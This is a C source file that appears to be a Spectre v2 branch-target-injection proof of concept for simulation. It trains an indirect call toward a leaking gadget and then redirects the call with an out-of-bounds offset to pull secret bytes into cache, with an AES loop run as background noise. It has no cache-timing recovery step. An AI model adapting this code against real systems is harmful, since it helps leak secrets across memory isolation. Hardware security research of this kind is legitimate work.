#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "aes.h"

// ==========================================
// PART 1: GLOBAL MEMORY (Same as V1)
// ==========================================
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "DefaultSecret";
uint8_t temp = 0;

// Define the function pointer type
typedef void (*target_func_ptr)(size_t);

// ==========================================
// PART 2: THE FUNCTIONS
// ==========================================

// 1. The GADGET (Malicious)
// We want the CPU to execute this speculatively
void spectre_gadget(size_t x) {
    // Note: No "if" check needed here because V2 jumps directly to the target.
    // However, we include the access pattern that leaks data.
    temp &= array2[array1[x] * 512];
}

// 2. The SAFE Function (Benign)
// This is what the code actually calls during the attack phase
void safe_function(size_t x) {
    // Harmless operation to waste a cycle
    (void)x;
}

// 3. The NOISE (AES)
void run_aes_workload() {
    uint8_t key[16] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };
    uint8_t in[16]  = { 0x6b, 0xc1, 0xbe, 0xe2, 0x2e, 0x40, 0x9f, 0x96, 0xe9, 0x3d, 0x7e, 0x11, 0x73, 0x93, 0x17, 0x2a };
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);
    for(int i=0; i<50; i++) AES_ECB_encrypt(&ctx, in);
}

// ==========================================
// PART 3: MAIN (V2 ATTACK)
// ==========================================
int main(int argc, char **argv) {
    if (argc > 1) secret = argv[1];
    size_t secret_len = strlen(secret);

    // Calculate offset
    size_t malicious_x = (size_t)(secret - (char*)array1);

    // Prepare function pointer
    target_func_ptr func_ptr;

    printf("Starting AES + Spectre V2 (BTB Injection)...\n");
    printf("Target Secret: %s\n", secret);

    // Initialize array2
    for (int i = 0; i < sizeof(array2); i++) array2[i] = 1;

    // --- MAIN LOOP ---
    for (int i = 0; i < secret_len; i++) {

        // A. Run Benign Workload (AES)
        run_aes_workload();

        // B. Spectre V2 Sequence

        // 1. TRAIN the BTB (Branch Target Buffer)
        // We make the CPU get used to jumping to 'spectre_gadget'
        // We use a safe index (0) so it doesn't crash/segfault during training
        func_ptr = &spectre_gadget;
        for (int train = 0; train < 20; train++) {
            func_ptr(0);
        }

        // 2. ATTACK
        // We switch the pointer to 'safe_function'.
        // BUT, the CPU will likely speculate that it is still 'spectre_gadget'.
        func_ptr = &safe_function;

        // Ideally, we would flush 'func_ptr' from cache here to slow down
        // the update, giving the CPU more time to speculate.
        // In simulation, the previous training loop is usually enough.

        // Call with malicious offset.
        // CPU speculates: spectre_gadget(malicious_x + i) -> Loads secret to cache
        // CPU Retires: safe_function(malicious_x + i) -> Does nothing
        func_ptr(malicious_x + i);
    }

    printf("Used temp: %d\n", temp);
    printf("Done.\n");
    return 0;
}
